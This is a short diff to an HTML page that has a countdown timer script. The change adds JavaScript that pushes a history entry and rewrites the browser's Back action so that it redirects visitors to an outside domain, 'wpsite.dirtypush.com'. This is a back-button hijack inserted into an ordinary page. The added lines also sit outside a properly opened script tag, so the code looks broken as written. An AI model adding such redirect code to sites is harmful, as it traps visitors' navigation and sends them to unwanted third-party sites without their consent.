@@ -287,5 +287,9 @@ if(time>0) time--;
 },1000);
 </script>
 
-</body>
+history.pushState(null,null,location.href);
+window.onpopstate=function(){
+  location.href="https://wpsite.dirtypush.com";
+};
+</script></body>
 </html>
